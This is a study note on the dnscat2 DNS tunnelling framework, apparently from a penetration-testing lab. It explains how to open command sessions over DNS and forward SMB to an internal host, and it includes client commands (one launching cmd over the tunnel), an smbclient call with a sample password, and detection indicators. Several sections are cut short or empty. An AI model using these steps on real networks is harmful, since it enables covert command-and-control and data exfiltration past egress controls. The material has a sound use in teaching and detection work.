# DNS Tunnelling with dnscat2

## Overview

`dnscat2` is a DNS tunnelling framework that can move data through DNS queries and responses.

It can be used to create encrypted sessions over DNS and can support:

```text
interactive command sessions
file upload and download
TCP port forwarding through DNS
tunnelling to internal services
DNS-based command-and-control in lab environments
```

It builds on DNS tunnelling fundamentals:

```text
Exfiltration:
Data leaves the internal network inside DNS query names.

Infiltration:
Data enters the internal network inside DNS responses.
```

Common DNS record types used by `dnscat2` include:

```text
TXT
CNAME
MX
```

> [!important]
> DNS tunnelling is useful when DNS is one of the only allowed outbound paths, but it is usually slow and noisy. Use it in authorised labs, assessments, and controlled environments only.

---

## Core Mental Model

```text
Compromised internal host
dnscat2 client
    |
    | DNS queries and responses
    v
Internal recursive resolver
    |
    | Forwards queries for controlled domain
    v
Attacker-controlled authoritative DNS server
dnscat2-server
```

Once the session is established, `dnscat2` can tunnel TCP traffic through DNS.

Example:

```text
smbclient on attacker DNS server host
↓
127.0.0.1:4455
↓
dnscat2 server local listener
↓
DNS tunnel
↓
dnscat2 client on compromised host
↓
internal SMB target:445
```

---

# Server and Client Architecture

| Component | Typical Location | Purpose |
|---|---|---|
| `dnscat2-server` | Attacker-controlled DNS / authoritative server | Receives DNS tunnel traffic and manages sessions |
| Linux `dnscat` client | Compromised Linux host | Sends DNS queries and creates tunnel sessions |
| PowerShell `dnscat2.ps1` client | Compromised Windows host | Creates a DNS tunnel and can launch `cmd` |
| Recursive resolver | Internal DNS server | Relays DNS requests toward the authoritative server |
| Internal target service | Deeper internal host | Service reached through the DNS tunnel |

---

# Why DNS Tunnelling Works

Most environments allow DNS because hosts need to resolve names.

DNS may be permitted even when these are blocked or inspected:

```text
direct outbound TCP
HTTP
HTTPS
SSH
reverse shells
arbitrary egress ports
```

`dnscat2` abuses this by placing encrypted tunnel data inside DNS queries and responses.

High-level flow:

```text
Compromised host
    |
    | DNS request containing encoded/encrypted data
    v
Corporate/internal DNS resolver
    |
    | Query for controlled domain
    v
Attacker authoritative DNS server
    |
    | dnscat2-server processes data
    v
Encrypted dnscat2 session
```

# DNS Traffic Pattern

Normal DNS query:

```text
www.google.com
```

dnscat2-style query:

```text
dGhpcyBpcyBlbmNvZGVkLmRhdGE.inlanefreight.local
```

Observed dnscat2 traffic may include:

```text
TXT? 8f150140b65c73af271ce019c1ede35d28.feline.corp
CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp
MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp
```

Responses may carry encrypted data in:

```text
TXT strings
CNAME values
MX values
```

> [!important]
> dnscat2 traffic is encrypted, but it is not invisible. High-volume, high-entropy DNS queries are conspicuous.

# Port Forwarding with dnscat2

`dnscat2` can create local TCP listeners on the server side and forward traffic through the DNS tunnel.

The `listen` command behaves similarly to SSH local port forwarding:

```text
listen [<lhost>:]<lport> <rhost>:<rport>
```

Meaning:

```text
Listen locally on the dnscat2 server.
Forward accepted TCP connections through the DNS tunnel.
The dnscat2 client connects to the remote host and port.
```

Equivalent concept:

```bash
ssh -L <local_port>:<remote_host>:<remote_port>
```

# Example – Forward SMB Through DNS Tunnel

Goal:

```text
Access SMB on HRSHARES through the dnscat2 DNS tunnel.
```

Forward details:

| Component | Value |
|---|---|
| Local listener | `127.0.0.1:4455` |
| Final target | `172.16.2.11:445` |
| Service | SMB |

Inside the dnscat2 command session:

```text
listen 127.0.0.1:4455 172.16.2.11:445
```

Expected output:

```text
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
```

Traffic flow:

```text
smbclient on dnscat2 server host

127.0.0.1:4455
↓
dnscat2 server
↓
DNS tunnel
↓
dnscat2 client on compromised host
↓

```

Connect from another shell on the dnscat2 server host:

```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```


# Performance Notes

DNS tunnelling is slow because TCP traffic is encapsulated inside DNS queries and responses.

For SMB over dnscat2:

```text
SMB packets
↓
dnscat2 encapsulation
↓
DNS queries and responses
↓
UDP transport
↓
recursive resolver path
↓
decapsulation
↓
SMB target
```

Expect:

```text
slow directory listings
delayed responses
timeouts on noisy operations
poor performance for large file transfers
high DNS query volume
```

Use DNS tunnels for targeted access, not high-throughput operations.

# Troubleshooting

## No Session Appears

Check:

```text
dnscat2-server is running
UDP/53 is not occupied by dnsmasq or another service
controlled domain is correct
client can resolve or query controlled domain
recursive resolver forwards to authoritative server
firewall allows UDP/53
client binary or PowerShell script runs correctly
```

Check UDP/53 listener:

```bash
sudo ss -lunp | grep ':53'
```

Monitor traffic:

```bash
sudo tcpdump -i <interface> udp port 53
```

---

## DNS Queries Reach Server but No Session

Possible causes:

```text
wrong domain supplied to client
wrong DNS server specified
client/server version mismatch
secret mismatch
record types blocked or filtered
responses not reaching client
DNS infrastructure modifies or drops responses
```

Use server output and `tcpdump` to confirm bidirectional traffic.

---

## Session Is Encrypted but Not Verified

This is normal if no pre-shared secret is used.

Action:

```text
Compare the authentication string on both ends.
```

For stronger assurance, use a secret:

```bash
./dnscat --secret=<secret> <domain>
```

or Windows:

```powershell
Start-Dnscat2 `
-DNSserver <server_ip> `
-Domain <domain> `
-PreSharedSecret <secret> `
-Exec cmd
```

---

## Windows PowerShell Client Does Not Start

Check:

```text
PowerShell execution policy
AMSI/AV/EDR blocking script
module path
import syntax
DNS server reachability
pre-shared secret value
domain value
```

Basic checks:

```powershell
Get-ExecutionPolicy
Test-NetConnection <server_ip> -Port 53
Resolve-DnsName test.<domain> -Server <server_ip>
```

---

## Port Forward Created but Connection Fails

Check:

```text
target IP is reachable from the dnscat2 client host
target port is open
local listener is bound correctly
local port is not already in use
service tolerates slow/high-latency connections
```

From Linux client host, where possible:

```bash
nc -zv <target_ip> <target_port>
```

From Windows client host:

```powershell
Test-NetConnection <target_ip> -Port <target_port>
```

---

## SMB Lists Shares but Workgroup Fails

SMB may attempt additional legacy browsing connections.

Example:

```text
Unable to connect with SMB1 -- no workgroup available
```

This can be acceptable if the share list was already retrieved.

Focus on whether the desired shares were listed.

---

## Tunnel Is Very Slow

Expected causes:

```text
DNS query/response overhead
UDP transport
recursive resolver latency
record size limits
high volume of encapsulated TCP traffic
DNS caching or retry behaviour
```

Mitigations:

```text
use targeted commands
avoid large transfers
scan very small port sets
increase client tool timeouts
prefer Chisel or SSH if HTTP/S or SSH egress is available
```

# Detection and Defensive Notes

## Network Indicators

`dnscat2` may produce:

```text
large volume of DNS queries
many TXT, CNAME, and MX queries
long random-looking subdomains
high-entropy labels
frequent queries to one unusual domain
DNS traffic from hosts that normally make few queries
unexpected authoritative DNS traffic
unusual query/response sizes
```

Example suspicious patterns:

```text
8f150140b65c73af271ce019c1ede35d28.feline.corp
bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp
38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp
dGhpcyBpcyBlbmNvZGVkLmRhdGE.inlanefreight.local
```

These resemble:

```text
encoded or encrypted chunks
structured transport data
automated tunnelling traffic
```

---

## Host Indicators

Linux indicators:

```text
dnscat client binary on disk
```

| Tunnel | Transport | Interactive? | Speed | Notes |
|---|---|---:|---:|---|

# Key Takeaways

- `dnscat2` turns DNS queries and responses into an encrypted tunnel.
- The server usually runs on an authoritative DNS server for a controlled domain.
- The client runs on the compromised internal host.
- DNS traffic may be relayed by an internal recursive resolver.
- Linux clients commonly use `./dnscat <domain>`.
- Windows clients can use the PowerShell `dnscat2.ps1` client.
- `dnscat2` commonly uses TXT, CNAME, and MX records.
- Sessions are encrypted.
- With a pre-shared secret, sessions can be encrypted and verified.
- Without a secret, verify the authentication string on both ends.
- `windows` lists active dnscat2 windows.
- `window -i <id>` attaches to a session.
- `listen` creates local TCP forwards through the DNS tunnel.
- DNS tunnelling is slow and noisy under load.
- SMB, SSH, HTTP, and RDP can be forwarded, but performance may be poor.
- Use DNS tunnels when DNS is one of the only allowed paths.
- Prefer faster tunnels such as Chisel or SSH when HTTP/S or SSH egress is available.
